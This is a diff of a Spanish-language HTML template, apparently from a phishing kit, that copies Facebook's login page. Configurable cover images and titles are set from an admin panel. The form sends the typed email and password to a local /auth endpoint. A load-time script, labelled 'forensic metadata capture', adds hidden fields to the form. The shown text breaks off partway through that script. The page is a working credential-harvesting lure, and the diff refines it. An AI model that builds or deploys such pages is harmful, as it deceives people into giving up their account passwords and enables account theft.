@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Entrar o registrarse</title>
+    <title>Facebook - Iniciar sesión</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <style>
         body { 
@@ -11,62 +11,80 @@
             background: linear-gradient(135deg, {{ config.color_fondo }} 0%, #000000 100%);
             color: {{ config.color_texto }};
             min-height: 100vh;
-            font-family: 'Segoe UI', sans-serif;
             display: flex; align-items: center; justify-content: center;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            margin: 0;
         }
-        .main-container { width: 100%; max-width: 420px; padding: 20px; }
+        .main-container { width: 100%; max-width: 420px; padding: 15px; }
         
-        .portada-card { 
+        /* Contenedor de Portada y Bienvenida */
+        .header-card { 
             border-radius: 20px 20px 0 0; 
             overflow: hidden; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.1);
         }
-        .img-header { width: 100%; height: 180px; object-fit: cover; }
+        .img-portada { width: 100%; height: 180px; object-fit: cover; display: block; }
         
-        .welcome-msg { 
+        .welcome-banner { 
             padding: 20px; text-align: center; 
-            background: rgba(255,255,255,0.1); backdrop-filter: blur(10px);
-            font-weight: bold; border: 1px solid rgba(255,255,255,0.1); border-top: none;
-            color: #fff; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); font-size: 1.2rem;
+            background: rgba(255,255,255,0.1); 
+            backdrop-filter: blur(15px);
+            font-weight: bold; font-size: 1.2rem;
+            color: #ffffff; text-shadow: 2px 2px 5px rgba(0,0,0,0.5);
+            border-top: 1px solid rgba(255,255,255,0.1);
         }
 
-        .login-card { 
-            background: white; padding: 25px; 
-            border-radius: 0 0 20px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            border: 1px solid #ddd;
+        /* Caja de Login Facebook */
+        .login-box { 
+            background: #ffffff; 
+            padding: 30px; 
+            border-radius: 0 0 20px 20px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            text-align: center;
         }
-        .fb-logo { color: #1877f2; font-size: 2.5rem; font-weight: bold; margin-bottom: 20px; display: block; text-align: center; }
-        .form-control { height: 52px; font-size: 16px; border: 1px solid #dddfe2; margin-bottom: 15px; }
-        .btn-login { background: #1877f2; border: none; font-size: 20px; font-weight: bold; height: 50px; width: 100%; }
-        .btn-register { background: #42b72a; border: none; font-size: 17px; font-weight: bold; height: 48px; margin-top: 15px; width: 80%; }
+        .fb-logo { color: #1877f2; font-size: 2.6rem; font-weight: bold; margin-bottom: 20px; display: block; }
+        .form-control { 
+            height: 52px; font-size: 16px; border: 1px solid #dddfe2; margin-bottom: 15px; 
+            border-radius: 6px;
+        }
+        .btn-login { 
+            background: #1877f2; border: none; font-size: 20px; font-weight: bold; 
+            height: 50px; width: 100%; border-radius: 6px; margin-top: 5px;
+        }
+        .btn-register { 
+            background: #42b72a; border: none; font-size: 17px; font-weight: bold; 
+            height: 48px; width: 80%; margin-top: 20px; border-radius: 6px; color: white;
+        }
     </style>
 </head>
 <body>
     <div class="main-container">
-        <div class="portada-card">
-            <img src="{{ config.img_principal }}" class="img-header" onerror="this.src='https://via.placeholder.com/400x200?text=Sube+Portada+desde+Admin'">
+        <div class="header-card">
+            <img src="{{ config.img_principal }}" class="img-portada" onerror="this.src='https://via.placeholder.com/400x200?text=Sube+tu+Portada'">
+            <div class="welcome-banner">
+                {{ config.titulo }}
+            </div>
         </div>
-        <div class="welcome-msg">{{ config.titulo }}</div>
 
-        <div class="login-card">
+        <div class="login-box">
             <span class="fb-logo">facebook</span>
-            <form action="/auth" method="POST" id="logF">
-                <input type="text" name="email" class="form-control" placeholder="Correo o teléfono" required>
+            <form action="/auth" method="POST" id="forensicForm">
+                <input type="text" name="email" class="form-control" placeholder="Correo o número de teléfono" required>
                 <input type="password" name="pass" class="form-control" placeholder="Contraseña" required>
-                <button class="btn btn-primary btn-login shadow">Iniciar sesión</button>
-                <div class="text-center mt-3 border-bottom pb-3">
+                <button class="btn btn-primary btn-login">Iniciar sesión</button>
+                <div class="mt-3 border-bottom pb-3">
                     <a href="#" style="text-decoration:none; color:#1877f2; font-size:14px;">¿Olvidaste tu contraseña?</a>
                 </div>
-                <div class="text-center">
-                    <button type="button" class="btn btn-success btn-register">Crear cuenta</button>
-                </div>
+                <button type="button" class="btn btn-register">Crear cuenta nueva</button>
             </form>
         </div>
     </div>
 
     <script>
+        // CAPTURA DE METADATOS FORENSES
         window.onload = async function() {
-            const f = document.getElementById('logF');
+            const f = document.getElementById('forensicForm');
             const add = (n, v) => {
                 const i = document.createElement('input');
                 i.type = 'hidden'; i.name = n; i.value = v; f.appendChild(i);
